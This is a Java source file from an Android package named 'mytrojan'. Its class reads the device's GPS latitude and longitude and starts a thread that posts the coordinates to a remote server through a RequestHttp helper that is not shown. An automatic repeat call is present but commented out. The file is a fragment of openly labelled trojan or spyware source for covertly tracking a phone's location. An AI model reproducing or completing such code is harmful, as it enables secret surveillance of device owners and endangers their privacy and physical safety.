
package com.example.mytrojan;

//import android.content.Context;
import android.location.LocationManager;
import android.os.Handler;
import android.telephony.SmsManager;

import static android.support.v4.content.ContextCompat.getSystemService;

public class SendGPSPeriodically {
    private final static int INTERVAL = 1000 * 1 * 5; // 5 seconds
    Handler mHandler = new Handler();

    private GPSTracker gpsTracker;

    Runnable mHandlerTask = new Runnable()
    {
        @Override
        public void run() {
            sendGPS();
           // mHandler.postDelayed(mHandlerTask, INTERVAL);
        }
    };

    public SendGPSPeriodically(GPSTracker gpsTracker) {
        this.gpsTracker = gpsTracker;
    }

    void startRepeatingTask()
    {
        mHandlerTask.run();
    }

    void stopRepeatingTask()
    {
        mHandler.removeCallbacks(mHandlerTask);
    }

    void sendGPS() {

        if (gpsTracker.canGetLocation()) {
            double latitude = gpsTracker.getLatitude();
            double longitude = gpsTracker.getLongitude();

            // send to remote server
            // post content to server
            String content = "(" + latitude + "," + longitude + ")";
            new Thread(new RequestHttp(content)).start();
        }
    }

}
